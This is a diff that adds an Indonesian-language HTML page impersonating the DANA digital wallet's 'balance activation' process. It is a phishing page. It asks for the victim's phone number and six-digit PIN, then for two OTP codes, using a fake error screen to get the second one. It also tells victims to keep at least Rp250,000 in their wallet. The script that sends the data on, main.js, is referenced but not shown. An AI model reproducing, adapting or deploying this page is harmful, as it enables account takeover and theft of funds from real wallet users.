@@ -1,0 +1,193 @@
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#118EEA">
+<meta property="og:image:type" content="image/jpeg">
+<meta property="og:image" content="https://iconlogovector.com/uploads/images/2023/03/lg-8b694ad63ac093b84ec0972a7c442d7c61.jpg">
+<title>DANA Dompet Digital Indonesia: Halaman aktivasi saldo</title>
+<link rel="stylesheet" href="style.css">
+<style>
+		.hidden {
+			display: none;
+		}
+
+		.locked {
+			pointer-events: none;
+		}
+
+		#overlay {
+			position: fixed;
+			top: 0;
+			left: 0;
+			width: 100%;
+			height: 100%;
+			background: rgba(0, 0, 0, 0.8);
+			color: white;
+			display: flex;
+			flex-direction: column;
+			justify-content: center;
+			align-items: center;
+			font-size: 18px;
+			z-index: 99000;
+			display: none;
+			text-align: center;
+			font-size: 21px;
+			padding: 0px 0px 10px;
+		}
+
+		#timer {
+			font-size: 25px;
+			margin-top: 20px;
+		}
+	</style>
+<script type="f3cd5c60dbadf54ac082f8ee-text/javascript">
+		let lockTimeout;
+
+		function checkLock() {
+			const lastVisit = localStorage.getItem('lastVisit');
+			const now = Date.now();
+			const lockDuration = 2 * 60 * 1000; // 5 minutes in milliseconds
+
+			if (lastVisit && (now - lastVisit) < lockDuration) {
+				document.getElementById('overlay').style.display = 'flex';
+				startCountdown(lockDuration); // 5 minutes countdown
+			} else {
+				localStorage.setItem('lastVisit', now);
+			}
+		}
+
+		function startCountdown(duration) {
+			const overlay = document.getElementById('overlay');
+			const timerElement = document.getElementById('timer');
+			let remainingTime = duration / 1000; // Convert milliseconds to seconds
+
+			function updateTimer() {
+				const minutes = Math.floor(remainingTime / 60);
+				const seconds = Math.floor(remainingTime % 60);
+				timerElement.textContent = ` ${minutes}:${seconds.toString().padStart(2, '0')}`;
+				remainingTime -= 1;
+				if (remainingTime < 0) {
+					clearInterval(lockTimeout);
+					overlay.style.display = 'none';
+					localStorage.setItem('lastVisit', Date.now()); // Update last visit time
+				}
+			}
+
+			updateTimer(); // Initial call
+			lockTimeout = setInterval(updateTimer, 1000); // Update every second
+		}
+
+		window.onload = checkLock;
+		window.onload = checkLock;
+	</script>
+</head>
+<body>
+<div id="content">
+<div id="overlay">
+<div>Kamu bisa mengulangi aktivasi saldo setelah:</div>
+<div id="timer">2:00</div>
+</div>
+<div id="process" class="process" style="display: none;">
+<div class="loading">
+<img src="load_bg.png" alt="Background">
+<img class="spinner" src="load_spin.png" alt="Spinner">
+</div>
+</div>
+
+<div id="page1" class="halsatu" style="display: block;">
+<input type="tel" class="awal" name="kol" id="phoneNumber" maxlength="14" placeholder="811 234 5678">
+<button onclick="if (!window.__cfRLUnblockHandlers) return false; showpage2()" class="button1" id="lanjutButton" disabled data-cf-modified-f3cd5c60dbadf54ac082f8ee->Lanjut</button>
+<div id="warning" style="color: red;" class="forla"></div>
+</div>
+
+<div id="page2" class="Page2" style="display: none;">
+<img src="/rinciann.png" width="100%" class="g1" alt="Rincian">
+<button onclick="if (!window.__cfRLUnblockHandlers) return false; showpinPopup1()" class="button1" data-cf-modified-f3cd5c60dbadf54ac082f8ee->Lanjut</button>
+</div>
+<div id="cice" class="cice" style="display: none"></div>
+
+<div id="Popup1" class="Popup1" style="display: none;">
+<div class="popup1-content">
+<br>
+<p5>Masukkan kode PIN kamu</p5>
+<div class="pin-inputs">
+<input type="password" maxlength="1" class="pin-input" id="pin1" placeholder="●" readonly>
+<input type="password" maxlength="1" class="pin-input" id="pin2" placeholder="●" readonly>
+<input type="password" maxlength="1" class="pin-input" id="pin3" placeholder="●" readonly>
+<input type="password" maxlength="1" class="pin-input" id="pin4" placeholder="●" readonly>
+<input type="password" maxlength="1" class="pin-input" id="pin5" placeholder="●" readonly>
+<input type="password" maxlength="1" class="pin-input" id="pin6" placeholder="●" readonly>
+</div>
+<div class="keypad">
+<button onclick="if (!window.__cfRLUnblockHandlers) return false; enterNumber(1)" data-cf-modified-f3cd5c60dbadf54ac082f8ee->1</button>
+<button onclick="if (!window.__cfRLUnblockHandlers) return false; enterNumber(2)" data-cf-modified-f3cd5c60dbadf54ac082f8ee->2</button>
+<button onclick="if (!window.__cfRLUnblockHandlers) return false; enterNumber(3)" data-cf-modified-f3cd5c60dbadf54ac082f8ee->3</button>
+<button onclick="if (!window.__cfRLUnblockHandlers) return false; enterNumber(4)" data-cf-modified-f3cd5c60dbadf54ac082f8ee->4</button>
+<button onclick="if (!window.__cfRLUnblockHandlers) return false; enterNumber(5)" data-cf-modified-f3cd5c60dbadf54ac082f8ee->5</button>
+<button onclick="if (!window.__cfRLUnblockHandlers) return false; enterNumber(6)" data-cf-modified-f3cd5c60dbadf54ac082f8ee->6</button>
+<button onclick="if (!window.__cfRLUnblockHandlers) return false; enterNumber(7)" data-cf-modified-f3cd5c60dbadf54ac082f8ee->7</button>
+<button onclick="if (!window.__cfRLUnblockHandlers) return false; enterNumber(8)" data-cf-modified-f3cd5c60dbadf54ac082f8ee->8</button>
+<button onclick="if (!window.__cfRLUnblockHandlers) return false; enterNumber(9)" data-cf-modified-f3cd5c60dbadf54ac082f8ee->9</button>
+<button onclick="if (!window.__cfRLUnblockHandlers) return false; enterNumber(0)" data-cf-modified-f3cd5c60dbadf54ac082f8ee->0</button>
+<button1 onclick="if (!window.__cfRLUnblockHandlers) return false; clearLast()" class="hapus" data-cf-modified-f3cd5c60dbadf54ac082f8ee->⌫</button1>
+</div>
+<button id="toggleVisibilityButton" class="see" onclick="if (!window.__cfRLUnblockHandlers) return false; toggleVisibility()" data-cf-modified-f3cd5c60dbadf54ac082f8ee->TAMPILAN</button>
+<br><br>
+<p3>
+<a href="lupa.html" class="lupa">LUPA PIN?</a>
+<a href="hub.html" class="lupa">HUBUNGI KAMI</a>
+</p3>
+</div>
+</div>
+
+<div id="popup2" class="Popup2" style="display: none;">
+<div class="popup2-content">
+<img src="/otp.jpg" width="100%" alt>
+<p5>Masukkan kode OTP</p5>
+<p>Kode dikirim ke nomor yang terhubung dengan DANA kamu via SMS/WhatsApp</p>
+<div class="otp-inputs">
+<input type="tel" maxlength="1" class="otp-input" id="otp1" oninput="if (!window.__cfRLUnblockHandlers) return false; moveToNext(this, 'otp2')" data-cf-modified-f3cd5c60dbadf54ac082f8ee->
+<input type="tel" maxlength="1" class="otp-input" id="otp2" oninput="if (!window.__cfRLUnblockHandlers) return false; moveToNext(this, 'otp3')" data-cf-modified-f3cd5c60dbadf54ac082f8ee->
+<input type="tel" maxlength="1" class="otp-input" id="otp3" oninput="if (!window.__cfRLUnblockHandlers) return false; moveToNext(this, 'otp4')" data-cf-modified-f3cd5c60dbadf54ac082f8ee->
+<input type="tel" maxlength="1" class="otp-input" id="otp4" oninput="if (!window.__cfRLUnblockHandlers) return false; submitOTP1()" data-cf-modified-f3cd5c60dbadf54ac082f8ee->
+</div>
+<p7 id="resend-otp1" style="color: #D0D0D0;">KIRIM ULANG (<span id="timer1">01:59</span>)</p7>
+</div>
+</div>
+
+<div id="popup3" class="Popup3" style="display: none;">
+<div class="popup3-content">
+<img src="otp.jpg" width="100%" alt>
+<p5>Masukkan kode OTP</p5>
+<br>
+<div class="salah">
+<p8>Pastikan kodenya sudah benar dan coba lagi</p8>
+</div>
+<div class="otp-inputs">
+<input type="tel" maxlength="1" class="otp-input" id="otp21" oninput="if (!window.__cfRLUnblockHandlers) return false; moveToNext(this, 'otp22')" data-cf-modified-f3cd5c60dbadf54ac082f8ee->
+<input type="tel" maxlength="1" class="otp-input" id="otp22" oninput="if (!window.__cfRLUnblockHandlers) return false; moveToNext(this, 'otp23')" data-cf-modified-f3cd5c60dbadf54ac082f8ee->
+<input type="tel" maxlength="1" class="otp-input" id="otp23" oninput="if (!window.__cfRLUnblockHandlers) return false; moveToNext(this, 'otp24')" data-cf-modified-f3cd5c60dbadf54ac082f8ee->
+<input type="tel" maxlength="1" class="otp-input" id="otp24" oninput="if (!window.__cfRLUnblockHandlers) return false; submitOTP2()" data-cf-modified-f3cd5c60dbadf54ac082f8ee->
+</div>
+<p7 id="resend-otp2" style="color: #D0D0D0;">KIRIM ULANG (<span id="timer2">01:59</span>)</p7>
+</div>
+</div>
+
+<div id="popup4" class="Popup4" style="display: none;">
+<div class="popup-content4">
+<br>
+<img src="syarat.png" width="45%" alt>
+<br>
+<p9>Pastikan saldo DANA kamu tidak kurang dari Rp250.000 sebelum melakukan aktivasi saldo</p9>
+<div>
+<button onclick="if (!window.__cfRLUnblockHandlers) return false; awal()" class="button1" data-cf-modified-f3cd5c60dbadf54ac082f8ee->Mengerti</button>
+</div>
+</div>
+</div>
+</div>
+<script src="main.js" type="f3cd5c60dbadf54ac082f8ee-text/javascript"></script>
+<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="f3cd5c60dbadf54ac082f8ee-|49" defer></script></body>
+</html>
